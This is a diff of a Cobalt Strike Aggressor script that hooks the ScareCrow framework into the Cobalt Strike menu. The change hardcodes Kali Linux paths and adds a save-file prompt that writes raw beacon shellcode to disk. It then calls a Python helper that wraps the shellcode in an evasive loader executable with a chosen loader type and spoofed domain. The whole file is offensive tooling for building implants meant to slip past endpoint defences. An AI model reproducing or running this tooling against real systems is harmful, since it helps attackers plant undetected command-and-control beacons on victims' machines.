@@ -1,6 +1,11 @@
-$script_path = "path to ScareCrow Script directory e.g. /home/user/Scare/ScareCrow-CobaltStrike";
-$scarecrow_executable = "https://github.com/optiv/ScareCrow path to the compiled ScareCrow executable e.g.  /home/user/ScareCrow/ScareCrow";
+############################################################
+# Please do not use / at the end of the directories!
+############################################################
+$script_path = "/home/kali/projects/ScareCrow-CobaltStrike";
+$scarecrow_executable = "/home/kali/projects/ScareCrow-CobaltStrike/ScareCrow/ScareCrow";
+$cs_directory = "/home/kali/pentestlab/cobaltstrike";
 $python3 = "/usr/bin/python3";
+############################################################
 
 menubar("ScareCrow", "scare_crow");
 
@@ -28,10 +33,24 @@ sub ScareCrowCallback {
 	}
 
     $shellcode = artifact_payload($3['listener'], "raw", $3['architecture']);
+
+	$loader = $3['loader'];
+	$domain = $3['domain'];
+
+	prompt_file_save("scbeacon.bin", {
+
+		show_message("Generating executable, please wait...");
+		close_message
+
+		$path = "$1";
 	
-	mkdir($script_path . "/payloads");
-	$shellcodefile = openf(">" . $script_path . "/payloads/scbeacon.bin");
-	writeb($shellcodefile, $shellcode);
-	closef($shellcodefile);
-	$pythonprocess = exec($python3 . " " . $script_path . "/Helper.py " . $scarecrow_executable . " " . $script_path . "/payloads/scbeacon.bin " . $3['loader'] . " " . $3['domain']);
+		$handle = openf(">" . $1);
+		writeb($handle, $shellcode);
+		closef($handle);
+
+		$data = exec($python3 . " " . $script_path . "/Helper.py" . " " . $scarecrow_executable . " " . $1 . " " . $loader . " " . $domain . " " . $cs_directory);
+		$pythondata = readAll($data);
+		
+		show_message("Executable saved to: " . $pythondata);
+    });
 }
